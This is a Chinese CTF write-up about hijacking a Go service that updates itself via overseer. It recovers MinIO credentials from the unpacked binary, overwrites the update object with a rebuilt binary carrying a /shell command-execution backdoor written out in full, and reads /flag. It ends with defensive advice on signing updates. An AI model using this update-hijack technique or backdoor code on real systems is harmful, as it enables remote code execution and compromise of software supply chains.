# Level 25 双面人派对

## 题目简述

题目开放了两个端口：其中一个会直接下载名为 `main` 的程序，另一个则是 MinIO 对象存储服务。`main` 使用 `overseer` 实现可执行文件自更新，并从 MinIO 的固定对象获取更新包。目标是从程序中恢复对象存储配置，覆盖更新对象，让服务自动执行攻击者提供的新版本。

## 解题过程

### 1. 从程序中恢复更新配置

下载 `main` 后，先用 UPX 解包：

```bash
upx -d main
```

随后可在 IDA 中检查字符串和配置结构，也可直接用 `strings` 搜索 `minio`、`bucket`、`access_key` 等关键词。程序内置了如下题目环境配置：

```yaml
minio:
  endpoint: "127.0.0.1:9000"
  access_key: "minio_admin"
  secret_key: "JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs="
  bucket: "prodbucket"
  key: "update"
```

这说明第二个端口并不是另一个 Web 页面，而是 MinIO API；服务会把 `prodbucket/update` 当作自己的更新文件。以上凭据仅属于题目环境，不应复用到任何真实系统。

可使用 MinIO Client 连接题目端口，并先下载原更新对象进行确认：

```bash
mc alias set hgame http://challenge.example:9000 \
  minio_admin 'JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs='
mc cp hgame/prodbucket/update ./update
```

### 2. 构造兼容 `overseer` 的更新程序

程序源码使用 `overseer` 管理自更新。更新文件不能只是任意 ELF：它自身也必须按 `overseer` 的启动约定运行，否则旧进程即使下载并替换了文件，新版本也无法正常接管服务。因此应在题目提供的 Go 源码上修改，而不是另写一个普通 Web 服务。

在原有 `program` 函数中加入命令执行路由：

```go
package main

import (
    "os/exec"

    "github.com/gin-gonic/gin"
    "github.com/jpillora/overseer"
)

func program(state overseer.State) {
    g := gin.Default()

    // 原程序的静态路由会与新增路由发生冲突，应将其移除。
    // g.StaticFS("/", gin.Dir(".", true))

    g.GET("/shell", func(c *gin.Context) {
        cmd, ok := c.GetQuery("cmd")
        if !ok {
            c.String(400, "missing cmd")
            return
        }

        out, err := exec.Command("bash", "-c", cmd).CombinedOutput()
        if err != nil {
            c.String(500, "%s\n%s", err, out)
            return
        }
        c.String(200, string(out))
    })

    _ = g.Run(":8080")
}
```

原静态文件托管路由必须注释掉，否则 Gin 注册冲突路由时会直接 `panic`。保留项目原有的 `main`、`overseer.Run(...)` 以及更新配置，只替换业务处理函数，然后按照原项目的目标平台重新编译。

### 3. 覆盖对象并等待自动更新

将编译得到的兼容程序覆盖上传到固定对象：

```bash
mc cp ./main hgame/prodbucket/update
```

无需先删除旧对象，直接覆盖即可。等待运行中的服务完成轮询、下载和重启后，访问新增路由：

```text
GET /shell?cmd=cat%20/flag HTTP/1.1
Host: challenge.example:8080
```

响应正文即为 flag。原 PDF 没有记录 flag 的具体字符串，因此这里不补造结果。

## 方法总结

本题的决定性缺陷位于软件更新信任链：可从客户端程序中恢复对象存储凭据，而更新桶又允许覆盖服务将要执行的对象。完整利用需要同时满足三点：识别第二个端口为 MinIO、定位 `prodbucket/update` 的更新语义、生成符合 `overseer` 协议的新程序。此类系统不能只依赖对象路径或静态密钥保护更新，更新制品还应使用独立的数字签名进行真实性校验，并为存储凭据设置最小权限和定期轮换。
